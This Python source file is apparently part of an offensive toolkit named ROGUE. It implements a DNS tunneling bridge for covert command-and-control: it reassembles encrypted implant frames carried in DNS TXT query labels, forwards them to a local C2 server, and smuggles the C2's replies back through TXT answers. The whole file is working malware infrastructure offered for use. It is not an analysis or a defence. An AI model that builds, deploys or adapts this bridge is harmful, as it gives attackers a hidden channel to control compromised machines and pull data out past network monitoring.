#!/usr/bin/env python3
"""
PAYLOAD: DNS Tunneling Bridge
=================================================
Turns DNS queries into a covert C2 transport tier.

Architecture:
  * The IMPLANT encodes its (already end-to-end encrypted) v2 C2 frame as
    base64url labels in a DNS TXT query for the operator's zone.
  * This bridge runs on the operator's DNS host (authoritative for the zone,
    or reachable directly). It reassembles the frame, forwards the RAW bytes
    to the local C2 over HTTP, and answers the query's TXT record with the
    C2's (still encrypted) response.
  * The bridge never sees plaintext: crypto is end-to-end between implant and
    C2 (X25519 + AES-256-GCM). DNS is just a dumb pipe.

Client side lives in the ROGUE v2 core (rogue_v2_core.py, embedded in the
implant): rv2_dns_tunnel_send() sends one frame per DNS query (with EDNS0 so
full-size frames fit). Operator can also push commands with scripts/rogue_op.py.

Usage:
  python3 dnstunnel.py --mode server --domain c2.example.com \\
      --listen-port 53 --c2-url http://127.0.0.1:4444/
"""

import argparse
import base64
import json
import os
import socket
import sys
import time

try:
    import dns.message
    import dns.query
    import dns.rdata
    import dns.rdataclass
    import dns.rdatatype
    import dns.rrset
    _HAS_DNSPYTHON = True
except Exception:
    _HAS_DNSPYTHON = False


class DNSTunnelBridge(object):
    """UDP DNS server: query in  -> raw v2 frame to local C2 -> TXT answer out."""

    def __init__(self, domain, listen_ip="0.0.0.0", listen_port=53, c2_url="http://127.0.0.1:4444/",
                 timeout=8.0):
        self.domain = domain.strip(".").lower()
        self.listen_ip = listen_ip
        self.listen_port = listen_port
        self.c2_url = c2_url
        self.timeout = timeout
        self.running = False
        # chunk reassembly buffers: key (client_ip, rnd) -> {"labels": [], "last": ts}
        self._buffers = {}

    # ------------------------------------------------------------------ #
    def _parse_query_name(self, qname):
        """Parse '<rnd>.<idx>.<total>.<b64chunk>.<domain>' queries.
        Returns (rnd, idx, total, b64chunk, ok). Case of data labels is
        PRESERVED (base64url is case-sensitive); only the domain suffix is
        compared case-insensitively."""
        qname = qname.rstrip(".")
        parts = qname.split(".")
        dom_len = len(self.domain.split("."))
        if len(parts) < dom_len + 4:
            return None, None, None, None, False
        if ".".join(parts[-dom_len:]).lower() != self.domain:
            return None, None, None, None, False
        rnd, idx, total, chunk = parts[: -dom_len]
        if not rnd or len(rnd) > 16 or not rnd.isalnum():
            return None, None, None, None, False
        if not idx.isdigit() or not total.isdigit():
            return None, None, None, None, False
        idx, total = int(idx), int(total)
        if idx >= total or total > 64 or not chunk or len(chunk) > 60:
            return None, None, None, None, False
        return rnd, idx, total, chunk, True

    def _b64url_decode(self, s):
        s = s.replace("-", "+").replace("_", "/")
        s += "=" * ((4 - len(s) % 4) % 4)
        return base64.b64decode(s)

    def _b64url_encode(self, data):
        return base64.urlsafe_b64encode(data).decode().rstrip("=")

    def _forward_to_c2(self, raw_frame):
        """POST raw encrypted frame to the local C2, return raw response bytes."""
        import urllib.request
        req = urllib.request.Request(self.c2_url, data=raw_frame, method="POST",
                                     headers={"Content-Type": "application/octet-stream",
                                              "User-Agent": "Rogue-DNS-Bridge/3.3"})
        with urllib.request.urlopen(req, timeout=self.timeout) as r:
            return r.read()

    # ------------------------------------------------------------------ #
    def _answer_txt(self, request, qname, payload_b64, sock, addr):
        """Answer the query with TXT strings carrying payload_b64 ('' = ack)."""
        if not _HAS_DNSPYTHON:
            return
        response = dns.message.make_response(request)
        try:
            if request.edns >= 0:
                response.use_edns(0, payload=4096)
        except Exception:
            pass
        strings = [payload_b64[i:i + 200] for i in range(0, len(payload_b64), 200)] or ["ack"]
        if payload_b64 == "":
            strings = ["ack"]
        # ONE rdata with multiple character-strings (never several rdatas:
        # rrsets order rdatas with a set -> wire order would be scrambled)
        rd = dns.rdata.from_text(dns.rdataclass.IN, dns.rdatatype.TXT,
                                 " ".join('"%s"' % s for s in strings))
        rrset = dns.rrset.RRset(qname, dns.rdataclass.IN, dns.rdatatype.TXT)
        rrset.add(rd)
        rrset.ttl = 1
        response.answer.append(rrset)
        sock.sendto(response.to_wire(), addr)

    def _expire_buffers(self):
        now = time.time()
        dead = [k for k, (b, ts) in self._buffers.items() if now - ts > 4.0]
        for k in dead:
            del self._buffers[k]

    def serve_once(self, data, addr, sock):
        try:
            request = dns.message.from_wire(data)
        except Exception:
            return
        for question in request.question:
            qname = str(question.name)
            rnd, idx, total, chunk, ok = self._parse_query_name(qname)
            if not ok:
                continue
            self._expire_buffers()
            key = (addr[0], rnd)
            if key not in self._buffers:
                self._buffers[key] = ({}, time.time())
            chunks_map, _ = self._buffers[key]
            chunks_map[idx] = chunk
            self._buffers[key] = (chunks_map, time.time())
            is_last = (len(chunks_map) == total)
            if not is_last:
                self._answer_txt(request, question.name, "", sock, addr)
                continue
            # whole frame reassembled -> forward to C2
            b64 = "".join(chunks_map[i] for i in range(total))
            del self._buffers[key]
            try:
                raw = self._b64url_decode(b64)
            except Exception:
                self._answer_txt(request, question.name, "", sock, addr)
                continue
            try:
                resp_raw = self._forward_to_c2(raw)
            except Exception as e:
                print("[!] C2 forward failed: %s" % e)
                resp_raw = None
            if resp_raw:
                self._answer_txt(request, question.name, self._b64url_encode(resp_raw), sock, addr)
                print("[DNS] %s -> C2 round trip (%d bytes in, %d out, %d queries)"
                      % (addr[0], len(raw), len(resp_raw), total))
            else:
                self._answer_txt(request, question.name, "", sock, addr)

    def run(self):
        if not _HAS_DNSPYTHON:
            print("[!] dnspython is required for the bridge (pip install dnspython)")
            return
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((self.listen_ip, self.listen_port))
        sock.settimeout(1.0)
        print("[+] DNS bridge listening on %s:%d (zone: %s)" % (self.listen_ip, self.listen_port, self.domain))
        print("[+] Forwarding raw frames to C2: %s" % self.c2_url)
        self.running = True
        while self.running:
            try:
                data, addr = sock.recvfrom(65535)
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                self.serve_once(data, addr, sock)
            except Exception as e:
                print("[!] serve error: %s" % e)
        sock.close()

    def stop(self):
        self.running = False


def main():
    ap = argparse.ArgumentParser(description="ROGUE DNS tunneling bridge (v2 frames <-> C2)")
    ap.add_argument("--mode", choices=["server"], default="server")
    ap.add_argument("--domain", required=True, help="zone this server answers for, e.g. c2.example.com")
    ap.add_argument("--listen-ip", default="0.0.0.0")
    ap.add_argument("--listen-port", type=int, default=53)
    ap.add_argument("--c2-url", default=os.environ.get("ROGUE_C2_URL", "http://127.0.0.1:4444/"))
    args = ap.parse_args()

    if not _HAS_DNSPYTHON:
        print("[!] dnspython not installed - run: pip install dnspython")
        return 1

    bridge = DNSTunnelBridge(domain=args.domain, listen_ip=args.listen_ip,
                             listen_port=args.listen_port, c2_url=args.c2_url)
    try:
        bridge.run()
    except KeyboardInterrupt:
        print("\n[+] Stopping DNS bridge")
    return 0


if __name__ == "__main__":
    sys.exit(main())
